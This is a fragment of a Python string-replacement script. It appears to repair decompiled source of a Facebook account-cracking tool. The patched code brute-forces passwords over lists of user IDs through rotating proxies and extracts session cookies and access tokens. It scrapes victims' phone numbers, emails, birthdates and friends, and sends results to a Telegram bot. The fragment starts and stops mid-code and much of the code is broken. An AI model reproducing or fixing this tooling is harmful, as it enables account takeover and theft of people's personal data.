        'Z'])""","""random.choice(['A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'])""").replace("""Qredes = 0x38D7EA4C67FFsource""","""""").replace("""sr, **('target',)""","""target=sr""").replace("""h, **('headers',))""","""headers=h)""").replace("""header, **('headers',))""","""headers=header""").replace("""ser, (), **('target', 'args'))""","""target=ser, args=())""").replace("""ser, **('target',)""","""target=ser""") .replace("""if not None:
                    pass""","""""").replace("""head, data, **('headers', 'data'))""","""headers=head, data=data)""").replace("""h, d, 0.4, **('headers', 'data', 'timeout'))""","""headers=h, data=d, timeout=0.4)""").replace("""+= 1
            os.system""","""+= 1
        os.system""").replace("""+= 1
            us""","""+= 1
        us""").replace("""he, **('headers',))""","""headers=he)""").replace("""if not None:
                    pass""","""""").replace("""he, data, **('headers', 'data'))""","""headers=he, data=data)""").replace("""he, da, **('headers', 'data'))""","""headers=he, data=da)""").replace("""except Exception as e:IndexError""","""except IndexError:""").replace("""lambda .0: for x in .0:
""","").replace("""hea, **('headers',))""","""headers=hea)""").replace("""+= 1
                        requests.get('https://api.telegram.org/bot' + str(token) + '/sendMessage?chat_id=' + str(ID) + '&text=' + str(statuscp))""","""+= 1
                    requests.get('https://api.telegram.org/bot' + str(token) + '/sendMessage?chat_id=' + str(ID) + '&text=' + str(statuscp))""").replace("""ok += 1
                    coki = po.cookies.get_dict()""","""ok += 1
                coki = po.cookies.get_dict()""").replace("""        if 'ya' in taplikasi:""","""            if 'ya' in taplikasi:""").replace("""+= 1
                            infoakun""","""+= 1
                        infoakun""").replace("""in cek2:
                    infoakun +=""","""in cek2:
                        infoakun +=""").replace("""else:
                    (hit1, hit2) = (0, 0)""","""else:
                        (hit1, hit2) = (0, 0)""").replace("""if __name__=='__main__':
	try:os.system('git pull')
	except:pass
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.mkdir('/sdcard/ALVINO-DUMP')
	except:pass
	try:os.system('touch .prox.txt')
	except:pass
	try:os.system('pkg install play-audio')
	except:pass
	try:os.system('clear')
	except:pass
    login()""","""if __name__=='__main__':
	try:os.system('git pull')
	except:pass
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.mkdir('/sdcard/ALVINO-DUMP')
	except:pass
	try:os.system('touch .prox.txt')
	except:pass
	try:os.system('pkg install play-audio')
	except:pass
	try:os.system('clear')
	except:pass
	login()""").replace("""data, **('data',))""","""data=data)""").replace("""dat, cos, **('data', 'cookies'))""","""data=dat, cookies=cos)""").replace("""""","""""").replace("""cos, **('cookies',))""","""cookies=cos)""").replace("""**('style',)))""","""style='bold'))""").replace("""        ses=requests.Session()
        for pw in pwv:""","""    ses=requests.Session()
    for pw in pwv:""") .replace("""copyright = '@psh_team'""","""""").replace("""random.choice([
        '6',
        '7',
        '8',
        '9',
        '10',
        '11',
        '12',
        '13'])""","""random.choice(['6','7','8','9','10','11','12','13'])""").replace("""random.choice([
        '6',
        '7',
        '8',
        '9',
        '10',
        '11',
        '12'])""","""random.choice(['6','7','8','9','10','11','12'])""").replace("""{
            'cookie': cookies }, **('headers', 'cookies'))""","""{
    'cookie': cookies
}, headers=headers, cookies=cookies)""").replace("""    def""","""def""").replace("""1, **('limit',))""","""limit=1)""").replace("""'تحقق', **('text',))""","""text='تحقق')""").replace("""kilwa = ''""","""kilwa = '""").replace("""kilwa = 'print('𓏳'*50)'""","""kilwa = ('𓏳'*50)""").replace("""passwrd, **('target',))""","""target=passwrd)""").replace("""+= 1
            tlg""","""+= 1
        tlg""").replace("""n't""","""nt""").replace("""d, h, **('data', 'headers'))""","""data=d, headers=h)""").replace("""{
                'cookie': cookies=cok)""","""cookies=cok)""").replace("""try:
                    print(e)
                except:
                    ""","""try:
                    print(e)
                except Exception as e:""").replace("""ok += 1
                coki""","""ok += 1
            coki""").replace("""    loop = 0
    lim = 0
    oks = []
    cps = []
    twf = []
    pcp = []
    tp = 0
    id = []
    tokenku = []""","""loop = 0
lim = 0
oks = []
cps = []
twf = []
pcp = []
tp = 0
id = []
tokenku = []""").replace("""if None.exceptions""","""except requests.exceptions""").replace("""if None:""","""except:""").replace("""

_ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(__[::-1])));


""","""""").replace("""
                    get_id = session.get('https://m.facebook.com/profile.php', coki, headapp, **('cookies', 'headers')).text""","""
                    get_id = session.get("https://m.facebook.com/profile.php",cookies=coki,headers=headapp).text""").replace("""
                    cek = session.get('https://m.facebook.com/settings/apps/tabbed/?tab=active', coki, headapp, **('cookies', 'headers')).text
                    cek2 = session.get('https://m.facebook.com/settings/apps/tabbed/?tab=inactive', coki, headapp, **('cookies', 'headers')).text""","""
                    cek =session.get("https://m.facebook.com/settings/apps/tabbed/?tab=active",cookies=coki,headers=headapp).text
                    cek2 = session.get("https://m.facebook.com/settings/apps/tabbed/?tab=inactive",cookies=coki,headers=headapp).text""").replace("""
                    response = session.get('https://m.facebook.com/profile.php?v=info', coki, headapp, **('cookies', 'headers')).text
                    response2 = session.get('https://m.facebook.com/profile.php?v=friends', coki, headapp, **('cookies', 'headers')).text
                    response3 = session.get(f'https://m.facebook.com/{user}/allactivity/?category_key=all&section_id=year_2022&timestart=1609488000&timeend=1641023999&sectionLoadingID=m_timeline_loading_div_1641023999_1609488000_8_', coki, headapp, **('cookies', 'headers')).text
                    response4 = session.get(f'https://m.facebook.com/timeline/app_collection/?collection_token={user}%3A184985071538002%3A32&_rdc=1&_rdr', coki, headapp, **('cookies', 'headers')).text""","""
                    response = session.get("https://m.facebook.com/profile.php?v=info",cookies=coki,headers=headapp).text
                    response2 = session.get("https://m.facebook.com/profile.php?v=friends",cookies=coki,headers=headapp).text
                    response3 = session.get(f"https://m.facebook.com/{user}/allactivity/?category_key=all&section_id=year_2022&timestart=1609488000&timeend=1641023999&sectionLoadingID=m_timeline_loading_div_1641023999_1609488000_8_",cookies=coki,headers=headapp).text
                    response4 = session.get(f"https://m.facebook.com/timeline/app_collection/?collection_token={user}%3A184985071538002%3A32&_rdc=1&_rdr",cookies=coki,headers=headapp).text""").replace("""
    if __name__ == '__main__':
    
    try:
        os.system('git pull')
    except Exception as e:
    
    try:
        os.mkdir('OK')
    except Exception as e:
    
    try:
        os.mkdir('CP')
    except Exception as e:
    
    try:
        os.mkdir('/sdcard/ALVINO-DUMP')
    except Exception as e:
    
    try:
        os.system('touch .prox.txt')
    except Exception as e:
    
    try:
        os.system('pkg install play-audio')
    except Exception as e:
    
    try:
        os.system('clear')
    except Exception as e:""","""
if __name__ == '__main__':    
    try:os.system('git pull')
    except:pass    
    try:os.mkdir('OK')
    except:pass    
    try:os.mkdir('CP')
    except:pass    
    try:os.mkdir('/sdcard/ALVINO-DUMP')
    except:pass    
    try:os.system('touch .prox.txt')
    except:pass    
    try:os.system('pkg install play-audio')
    except:pass
    try:os.system('clear')
    except:pass""").replace("""
        with requests.Session() as rsn:
            
            try:
                rsn.headers.update({
                    'Accept-Language': 'id,en;q=0.9',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
                    'Referer': 'https://www.instagram.com/',
                    'Host': 'www.facebook.com',
                    'Sec-Fetch-Mode': 'cors',
                    'Accept': '*/*',
                    'Connection': 'keep-alive',
                    'Sec-Fetch-Site': 'cross-site',
                    'Sec-Fetch-Dest': 'empty',
                    'Origin': 'https://www.instagram.com',
                    'Accept-Encoding': 'gzip, deflate' })
                response = rsn.get('https://www.facebook.com/x/oauth/status?client_id=124024574287414&wants_cookie_data=true&origin=1&input_token=&sdk=joey&blueirect_uri=https://www.instagram.com/brutalid_/', cookies={'cookie':cookie})
                if '"access_token":' in str(response.headers):
                    token = re.search('"access_token":"(.*?)"', str(response.headers)).group(1)""","""
        with requests.Session() as rsn:
            try:
                rsn.headers.update({
                    'Accept-Language': 'id,en;q=0.9',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
                    'Referer': 'https://www.instagram.com/',
                    'Host': 'www.facebook.com',
                    'Sec-Fetch-Mode': 'cors',
                    'Accept': '*/*',
                    'Connection': 'keep-alive',
                    'Sec-Fetch-Site': 'cross-site',
                    'Sec-Fetch-Dest': 'empty',
                    'Origin': 'https://www.instagram.com',
                    'Accept-Encoding': 'gzip, deflate',
                })
                response = rsn.get('https://www.facebook.com/x/oauth/status?client_id=124024574287414&wants_cookie_data=true&origin=1&input_token=&sdk=joey&redirect_uri=https://www.instagram.com/brutalid_/', cookies={'cookie':cookie})
                if '"access_token":' in str(response.headers):
                    token = re.search('"access_token":"(.*?)"', str(response.headers)).group(1)""").replace("""
                    nomer = re.findall('\\<a\\ href\\="tel\\:\\+.*?">\\<span\\ dir\\="ltr">(.*?)<\\/span><\\/a>', str(response))[0]
                except:pass
                nomer = ''
                try:
                    email = re.findall('\\<a href\\="https\\:\\/\\/lm\\.facebook\\.com\\/l\\.php\\?u\\=mail.*?" target\\=".*?"\\>(.*?)<\\/a\\>', str(response))[0].replace('&#064;', '@')
                except:pass
                email = ''
                try:
                    ttl = re.findall('\\<\\/td\\>\\<td\\ valign\\="top" class\\=".*?"\\>\\<div\\ class\\=".*?"\\>(\\d+\\s+\\w+\\s+\\d+)<\\/div\\>\\<\\/td\\>\\<\\/tr\\>', str(response))[0]
                except:pass
                ttl = ''
                try:
                    teman = re.findall('\\<h3\\ class\\=".*?"\\>Teman\\ \\((.*?)\\)<\\/h3\\>', str(response2))[0]
                except:pass
                teman = ''
                try:
                    pengikut = re.findall('\\<span\\ class\\=".*?"\\>(.*?)\\<\\/span\\>', str(response4))[1]
                except:pass
                pengikut = ''
                try:
                tahun = ''
                    cek_thn = re.findall('\\<div\\ class\\=".*?" id\\="year_(.*?)">', str(response3))
                    for nenen in cek_thn:
                        tahun += nenen + ', '
                except:pass""","""
			    nama = re.findall('\<title\>(.*?)<\/title\>',str(get_id))[0]
                try:nomer = re.findall('\<a\ href\=\"tel\:\+.*?\">\<span\ dir\=\"ltr\">(.*?)<\/span><\/a>',str(response))[0]
                except:nomer = ""
                try:email = re.findall('\<a href\=\"https\:\/\/lm\.facebook\.com\/l\.php\?u\=mail.*?\" target\=\".*?\"\>(.*?)<\/a\>',str(response))[0].replace('&#064;','@')
                except:email=""
                try:ttl = re.findall('\<\/td\>\<td\ valign\=\"top\" class\=\".*?\"\>\<div\ class\=\".*?\"\>(\d+\s+\w+\s+\d+)<\/div\>\<\/td\>\<\/tr\>',str(response))[0]
                except:ttl=""
                try:teman = re.findall('\<h3\ class\=\".*?\"\>Teman\ \((.*?)\)<\/h3\>',str(response2))[0]
                except:teman = ""
                try:pengikut = re.findall('\<span\ class\=\".*?\"\>(.*?)\<\/span\>',str(response4))[1]
                except:pengikut = ""
                try:tahun = ""
                    cek_thn = re.findall('\<div\ class\=\".*?\" id\=\"year_(.*?)\">',str(response3))
                        for nenen in cek_thn:
                            tahun += nenen+", "
                    except:pass""").replace("""bi = random.choice([
        u,    k,    kk,    b,    h,    hh])
    pers = loop * 100 / len(id2)""","""bi = random.choice([u,k,kk,b,h,hh])
    pers = loop*100/len(id2)""").replace("""
                    
                    try:""","""
                    try:""").replace("""                    get_id = session.get("https://m.facebook.com/profile.php",cookies=coki,headers=headapp).text
                    nama = re.findall('\\<title\\>(.*?)<\\/title\\>', str(get_id))[0]
                    response = session.get("https://m.facebook.com/profile.php?v=info",cookies=coki,headers=headapp).text
                    response2 = session.get("https://m.facebook.com/profile.php?v=friends",cookies=coki,headers=headapp).text
                    response3 = session.get(f"https://m.facebook.com/{user}/allactivity/?category_key=all&section_id=year_2022&timestart=1609488000&timeend=1641023999&sectionLoadingID=m_timeline_loading_div_1641023999_1609488000_8_",cookies=coki,headers=headapp).text
                    response4 = session.get(f"https://m.facebook.com/timeline/app_collection/?collection_token={user}%3A184985071538002%3A32&_rdc=1&_rdr",cookies=coki,headers=headapp).text
                    try:
                        nomer = re.findall('\\<a\\ href\\="tel\\:\\+.*?">\\<span\\ dir\\="ltr">(.*?)<\\/span><\\/a>', str(response))[0]
                    except:pass
                    nomer = ''
                    try:
                        email = re.findall('\\<a href\\="https\\:\\/\\/lm\\.facebook\\.com\\/l\\.php\\?u\\=mail.*?" target\\=".*?"\\>(.*?)<\\/a\\>', str(response))[0].replace('&#064;', '@')
                    except:pass
                    email = ''
                    try:
                        ttl = re.findall('\\<\\/td\\>\\<td\\ valign\\="top" class\\=".*?"\\>\\<div\\ class\\=".*?"\\>(\\d+\\s+\\w+\\s+\\d+)<\\/div\\>\\<\\/td\\>\\<\\/tr\\>', str(response))[0]
                    except:pass
                    ttl = ''
                    try:
                        teman = re.findall('\\<h3\\ class\\=".*?"\\>Teman\\ \\((.*?)\\)<\\/h3\\>', str(response2))[0]
                    except:pass
                    teman = ''
                    try:
                        pengikut = re.findall('\\<span\\ class\\=".*?"\\>(.*?)\\<\\/span\\>', str(response4))[1]
                    except:pass
                    pengikut = ''
                    try:
                        tahun = ''
                        cek_thn = re.findall('\\<div\\ class\\=".*?" id\\="year_(.*?)">', str(response3))
                        for nenen in cek_thn:
                            tahun += nenen + ', '
                    except:pass""","""                    get_id = session.get("https://m.facebook.com/profile.php",cookies=coki,headers=headapp).text
                    nama = re.findall('\\<title\\>(.*?)<\\/title\\>', str(get_id))[0]
                    response = session.get("https://m.facebook.com/profile.php?v=info",cookies=coki,headers=headapp).text
                    response2 = session.get("https://m.facebook.com/profile.php?v=friends",cookies=coki,headers=headapp).text
                    response3 = session.get(f"https://m.facebook.com/{user}/allactivity/?category_key=all&section_id=year_2022&timestart=1609488000&timeend=1641023999&sectionLoadingID=m_timeline_loading_div_1641023999_1609488000_8_",cookies=coki,headers=headapp).text
                    response4 = session.get(f"https://m.facebook.com/timeline/app_collection/?collection_token={user}%3A184985071538002%3A32&_rdc=1&_rdr",cookies=coki,headers=headapp).text
                    try:nomer = re.findall('\\<a\\ href\\="tel\\:\\+.*?">\\<span\\ dir\\="ltr">(.*?)<\\/span><\\/a>', str(response))[0]
                    except:nomer = ''
                    try:email = re.findall('\\<a href\\="https\\:\\/\\/lm\\.facebook\\.com\\/l\\.php\\?u\\=mail.*?" target\\=".*?"\\>(.*?)<\\/a\\>', str(response))[0].replace('&#064;', '@')
                    except:email = ''
                    try:ttl = re.findall('\\<\\/td\\>\\<td\\ valign\\="top" class\\=".*?"\\>\\<div\\ class\\=".*?"\\>(\\d+\\s+\\w+\\s+\\d+)<\\/div\\>\\<\\/td\\>\\<\\/tr\\>', str(response))[0]
                    except:ttl = ''
                    try:teman = re.findall('\\<h3\\ class\\=".*?"\\>Teman\\ \\((.*?)\\)<\\/h3\\>', str(response2))[0]
                    except:teman = ''
                    try:pengikut = re.findall('\\<span\\ class\\=".*?"\\>(.*?)\\<\\/span\\>', str(response4))[1]
                    except:pengikut = ''
                    try:
                    tahun = ''
                        cek_thn = re.findall('\\<div\\ class\\=".*?" id\\="year_(.*?)">', str(response3))
                        for nenen in cek_thn:
                            tahun += nenen + ', '
                    except:pass""").replace(""" = [
    '""","""=['""").replace("""
    '""","'").replace(""" = ""","""=""").replace("""b=random.choice([
        '9',
        '10',
        '11',
        '12'])
    c=random.choice([
        'V2147'])""","""
    b=random.choice(['9','10','11','12'])
    c=random.choice(['V2147'])""").replace("""[
        '""","""['""").replace("""statusok1, 'OK', **('title',)))""","""statusok1, title='OK'))""").replace("""
            (hit1, hit2)=(0, 0)
            cek=session.get('https://m.facebook.com/settings/apps/tabbed/?tab=active', coki, headapp, **('cookies', 'headers')).text
            cek2=session.get('https://m.facebook.com/settings/apps/tabbed/?tab=inactive', coki, headapp, **('cookies', 'headers')).text""","""
            hit1, hit2 = 0,0
            cek =session.get("https://m.facebook.com/settings/apps/tabbed/?tab=active",cookies=coki,headers=headapp).text
            cek2 = session.get("https://m.facebook.com/settings/apps/tabbed/?tab=inactive",cookies=coki,headers=headapp).text""").replace("""
            get_id=session.get('https://m.facebook.com/profile.php', coki, headapp, **('cookies', 'headers')).text
            nama=re.findall('\<title\>(.*?)<\/title\>', str(get_id))[0]
            response=session.get('https://m.facebook.com/profile.php?v=info', coki, headapp, **('cookies', 'headers')).text
            response2=session.get('https://m.facebook.com/profile.php?v=friends', coki, headapp, **('cookies', 'headers')).text
            response3=session.get(f'https://m.facebook.com/{user}/allactivity/?category_key=all&section_id=year_2022&timestart=1609488000&timeend=1641023999&sectionLoadingID=m_timeline_loading_div_1641023999_1609488000_8_', coki, headapp, **('cookies', 'headers')).text
            response4=session.get(f'https://m.facebook.com/timeline/app_collection/?collection_token={user}%3A184985071538002%3A32&_rdc=1&_rdr', coki, headapp, **('cookies', 'headers')).text""","""
            get_id = session.get("https://m.facebook.com/profile.php",cookies=coki,headers=headapp).text
            response = session.get("https://m.facebook.com/profile.php?v=info",cookies=coki,headers=headapp).text
            response2 = session.get("https://m.facebook.com/profile.php?v=friends",cookies=coki,headers=headapp).text
            response3 = session.get(f"https://m.facebook.com/{user}/allactivity/?category_key=all&section_id=year_2022&timestart=1609488000&timeend=1641023999&sectionLoadingID=m_timeline_loading_div_1641023999_1609488000_8_",cookies=coki,headers=headapp).text
            response4 = session.get(f"https://m.facebook.com/timeline/app_collection/?collection_token={user}%3A184985071538002%3A32&_rdc=1&_rdr",cookies=coki,headers=headapp).text""").replace("""
            try:
                nomer=re.findall('\<a\ href\="tel\:\+.*?">\<span\ dir\="ltr">(.*?)<\/span><\/a>', str(response))[0]
            except:pass
            nomer=''
            
            try:
                email=re.findall('\<a href\="https\:\/\/lm\.facebook\.com\/l\.php\?u\=mail.*?" target\=".*?"\>(.*?)<\/a\>', str(response))[0].replace('&#064;', '@')
            except:pass
            email=''
            
            try:
                ttl=re.findall('\<\/td\>\<td\ valign\="top" class\=".*?"\>\<div\ class\=".*?"\>(\d+\s+\w+\s+\d+)<\/div\>\<\/td\>\<\/tr\>', str(response))[0]
            except:pass
            ttl=''
            
            try:
                teman=re.findall('\<h3\ class\=".*?"\>Teman\ \((.*?)\)<\/h3\>', str(response2))[0]
            except:pass
            teman=''
            
            try:
                pengikut=re.findall('\<span\ class\=".*?"\>(.*?)\<\/span\>', str(response4))[1]
            except:pass
            pengikut=''
            
            try:
                tahun=''
                cek_thn=re.findall('\<div\ class\=".*?" id\="year_(.*?)">', str(response3))
                for nenen in cek_thn:
                    tahun += nenen + ', '
            except:pass''""","""
            try:nomer = re.findall('\<a\ href\=\"tel\:\+.*?\">\<span\ dir\=\"ltr\">(.*?)<\/span><\/a>',str(response))[0]
            except:nomer = ""
            try:email = re.findall('\<a href\=\"https\:\/\/lm\.facebook\.com\/l\.php\?u\=mail.*?\" target\=\".*?\"\>(.*?)<\/a\>',str(response))[0].replace('&#064;','@')
            except:email=""
            try:ttl = re.findall('\<\/td\>\<td\ valign\=\"top\" class\=\".*?\"\>\<div\ class\=\".*?\"\>(\d+\s+\w+\s+\d+)<\/div\>\<\/td\>\<\/tr\>',str(response))[0]
            except:ttl=""
            try:teman = re.findall('\<h3\ class\=\".*?\"\>Teman\ \((.*?)\)<\/h3\>',str(response2))[0]
            except:teman = ""
            try:pengikut = re.findall('\<span\ class\=\".*?\"\>(.*?)\<\/span\>',str(response4))[1]
            except:pengikut = ""
            try:
                tahun = ""
                cek_thn = re.findall('\<div\ class\=\".*?\" id\=\"year_(.*?)\">',str(response3))
                for nenen in cek_thn:
                    tahun += nenen+", "
            except:pass""").replace("""
    except:passrror""","""
    except FileNotFoundError as error:""").replace("""
    try:
        jum=input('[?] INPUT FILE : ')
        for line in open(jum, 'r').readlines():
            id.append(line.strip())
        print('[•] Total Id : ' + str(len(id)))
        setting()
    except Exception as e:
    print('[✘] No Connection  ')
    exit()
    (KeyError, IOError)
    print('[✘] Id Is Not Public')
    time.sleep(3)
    follower()""","""
	try:
		
        jum = input('[?] INPUT FILE : ')
		for line in open(jum, 'r').readlines():
			id.append(line.strip())
		print('√√ Total Id : '+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
			print(Z+'[✘] No Connection  ')
			exit()
	except (KeyError,IOError):
			print(Z+'[✘] Id Is Not Public')
			time.sleep(3)
			follower()""").replace("""

class Login:
    
def __init__(self):""","""

class Login:
    
    def __init__(self):""").replace("""
except Exception as e:
cetak""","""
except ImportError:
cetak""").replace("""
    import requests
except Exception as e:""","""
    import requests
except ImportError:""").replace("""
prox=open('.prox.txt', 'r').read().splitlines()

try:
    prox=requests.get('https://github.com/Pro-Max-420/Api/blob/main/prox.txt').text
    open('.prox.txt', 'w').write(prox)
except Exception as e:


try:
    pass
except:
    
    


prox=open('.prox.txt', 'r').read().splitlines()
""","""

import requests

try:


    prox= requests.get('https://github.com/Pro-Max-420/Api/blob/main/prox.txt').text


    open('.prox.txt','w').write(prox)


except Exception as e:


    pass


prox=open('.prox.txt','r').read().splitlines()

import webbrowser
import urllib3,rich,base64
from fake_useragent import UserAgent
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup as parser
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz
import os""").replace("""
except Exception as e:


try:
    print('𝙵𝙰𝙲𝙴𝙱𝙾𝙾𝙺')
except:
    
    


for xd in range(10000):""","""
except Exception as e:
	print(' ')
prox=open('.prox.txt','r').read().splitlines()
for xd in range(10000):""").replace("""
                    get_id=session.get("https://m.facebook.com/profile.php",cookies=coki,headers=headapp).text
                    nama=re.findall('\\<title\\>(.*?)<\\/title\\>', str(get_id))[0]
                    response=session.get("https://m.facebook.com/profile.php?v=info",cookies=coki,headers=headapp).text
                    response2=session.get("https://m.facebook.com/profile.php?v=friends",cookies=coki,headers=headapp).text
                    response3=session.get(f"https://m.facebook.com/{user}/allactivity/?category_key=all&section_id=year_2022&timestart=1609488000&timeend=1641023999&sectionLoadingID=m_timeline_loading_div_1641023999_1609488000_8_",cookies=coki,headers=headapp).text
                    response4=session.get(f"https://m.facebook.com/timeline/app_collection/?collection_token={user}%3A184985071538002%3A32&_rdc=1&_rdr",cookies=coki,headers=headapp).text
                    try:
                    nomer=re.findall('\\<a\\ href\\="tel\\:\\+.*?">\\<span\\ dir\\="ltr">(.*?)<\\/span><\\/a>', str(response))[0]
                except Exception as e:
                nomer=''
                try:
                    email=re.findall('\\<a href\\="https\\:\\/\\/lm\\.facebook\\.com\\/l\\.php\\?u\\=mail.*?" target\\=".*?"\\>(.*?)<\\/a\\>', str(response))[0].replace('&#064;', '@')
                except Exception as e:
                email=''
                try:
                    ttl=re.findall('\\<\\/td\\>\\<td\\ valign\\="top" class\\=".*?"\\>\\<div\\ class\\=".*?"\\>(\\d+\\s+\\w+\\s+\\d+)<\\/div\\>\\<\\/td\\>\\<\\/tr\\>', str(response))[0]
                except Exception as e:
                ttl=''
                try:
                    teman=re.findall('\\<h3\\ class\\=".*?"\\>Teman\\ \\((.*?)\\)<\\/h3\\>', str(response2))[0]
                except Exception as e:
                teman=''
                try:
                    pengikut=re.findall('\\<span\\ class\\=".*?"\\>(.*?)\\<\\/span\\>', str(response4))[1]
                except Exception as e:
                pengikut=''
                try:
                    tahun=''
                    cek_thn=re.findall('\\<div\\ class\\=".*?" id\\="year_(.*?)">', str(response3))
                    for nenen in cek_thn:
                        tahun += nenen + ', '
                except Exception as e:""","""
                    get_id=session.get("https://m.facebook.com/profile.php",cookies=coki,headers=headapp).text
                    nama = re.findall('\<title\>(.*?)<\/title\>',str(get_id))[0]
                    response = session.get("https://m.facebook.com/profile.php?v=info",cookies=coki,headers=headapp).text
                    response2 = session.get("https://m.facebook.com/profile.php?v=friends",cookies=coki,headers=headapp).text
                    response3 = session.get(f"https://m.facebook.com/{user}/allactivity/?category_key=all&section_id=year_2022&timestart=1609488000&timeend=1641023999&sectionLoadingID=m_timeline_loading_div_1641023999_1609488000_8_",cookies=coki,headers=headapp).text
                    response4 = session.get(f"https://m.facebook.com/timeline/app_collection/?collection_token={user}%3A184985071538002%3A32&_rdc=1&_rdr",cookies=coki,headers=headapp).text
                    try:nomer = re.findall('\<a\ href\=\"tel\:\+.*?\">\<span\ dir\=\"ltr\">(.*?)<\/span><\/a>',str(response))[0]
                    except:nomer = ""
                    try:email = re.findall('\<a href\=\"https\:\/\/lm\.facebook\.com\/l\.php\?u\=mail.*?\" target\=\".*?\"\>(.*?)<\/a\>',str(response))[0].replace('&#064;','@')
                    except:email=""
                    try:ttl = re.findall('\<\/td\>\<td\ valign\=\"top\" class\=\".*?\"\>\<div\ class\=\".*?\"\>(\d+\s+\w+\s+\d+)<\/div\>\<\/td\>\<\/tr\>',str(response))[0]
                    except:ttl=""
                    try:teman = re.findall('\<h3\ class\=\".*?\"\>Teman\ \((.*?)\)<\/h3\>',str(response2))[0]
                    except:teman = ""
                    try:pengikut = re.findall('\<span\ class\=\".*?\"\>(.*?)\<\/span\>',str(response4))[1]
                    except:pengikut = ""
                    try:
                        tahun = ""
                        cek_thn = re.findall('\<div\ class\=\".*?\" id\=\"year_(.*?)\">',str(response3))
                        for nenen in cek_thn:
                            tahun += nenen+", "
                    except:pass""").replace("""
try:
    import rich
except ImportError:
cetak(nel('\t• Sedang Menginstall Modul Rich •'))
os.system('pip install rich')

try:
    import stdiomask
except ImportError:
cetak(nel('\t• Sedang Menginstall Modul Stdiomask •'))
os.system('pip install stdiomask')

try:
    import requests
except ImportError:
print('')""","""
try:


        


        import rich


except ImportError:


        cetak(nel('\t• Sedang Menginstall Modul Rich •'))


        os.system('pip install rich')


try:


        import stdiomask


except ImportError:


        cetak(nel('\t• Sedang Menginstall Modul Stdiomask •'))


        os.system('pip install stdiomask')


try:


	import requests


except ImportError:


	print('')""").replace("""
request.install_opener(request.build_opener(proxy))

try:
    prox=requests.get('https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt').text
    open('.prox.txt', 'w').write(prox)
except Exception as e:


try:
    print(' ')
except Exception as e:



import requests

try:


    prox= requests.get('https://github.com/Pro-Max-420/Api/blob/main/prox.txt').text


    open('.prox.txt','w').write(prox)


except Exception as e:


    pass


prox=open('.prox.txt','r').read().splitlines()""","""
request.install_opener(request.build_opener(proxy))
import requests
try:
 prox= requests.get('https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt').text
 open('.prox.txt','w').write(prox)
except Exception as e:
 print(' ')
prox=open('.prox.txt','r').read().splitlines()
import requests
try:
    prox= requests.get('https://github.com/Pro-Max-420/Api/blob/main/prox.txt').text
    open('.prox.txt','w').write(prox)
except Exception as e:
    pass
prox=open('.prox.txt','r').read().splitlines()""").replace("""
request.install_opener(request.build_opener(proxy))
import requests
try:
 prox= requests.get('https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt').text
 open('.prox.txt','w').write(prox)
except Exception as e:
 print(' ')
prox=open('.prox.txt','r').read().splitlines()
import requests
try:
    prox= requests.get('https://github.com/Pro-Max-420/Api/blob/main/prox.txt').text
    open('.prox.txt','w').write(prox)
except Exception as e:
    pass
prox=open('.prox.txt','r').read().splitlines()
import webbrowser
import urllib3,rich,base64
from fake_useragent import UserAgent
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup as parser
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz
import os
try:
    import rich
except ImportError:
cetak(nel('\t• Sedang Menginstall Modul Rich •'))
os.system('pip install rich')

try:
    import stdiomask
except ImportError:
cetak(nel('\t• Sedang Menginstall Modul Stdiomask •'))
os.system('pip install stdiomask')

try:
    import requests
except ImportError:
print('')""","""request.install_opener(request.build_opener(proxy))
import requests
try:
 prox= requests.get('https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt').text
 open('.prox.txt','w').write(prox)
except Exception as e:
 print(' ')
prox=open('.prox.txt','r').read().splitlines()
import requests
try:
    prox= requests.get('https://github.com/Pro-Max-420/Api/blob/main/prox.txt').text
    open('.prox.txt','w').write(prox)
except Exception as e:
    pass
prox=open('.prox.txt','r').read().splitlines()
import webbrowser
import urllib3,rich,base64
from fake_useragent import UserAgent
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup as parser
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz
import os


try:


        


        import rich


except ImportError:


        cetak(nel('\t• Sedang Menginstall Modul Rich •'))


        os.system('pip install rich')


try:


        import stdiomask


except ImportError:


        cetak(nel('\t• Sedang Menginstall Modul Stdiomask •'))


        os.system('pip install stdiomask')


try:


	import requests


except ImportError:
        print('')
        """).replace("""
prox=open('.prox.txt','r').read().splitlines()

import webbrowser
import urllib3,rich,base64
from fake_useragent import UserAgent
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup as parser
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz
import os
try:
    import rich
except ImportError:
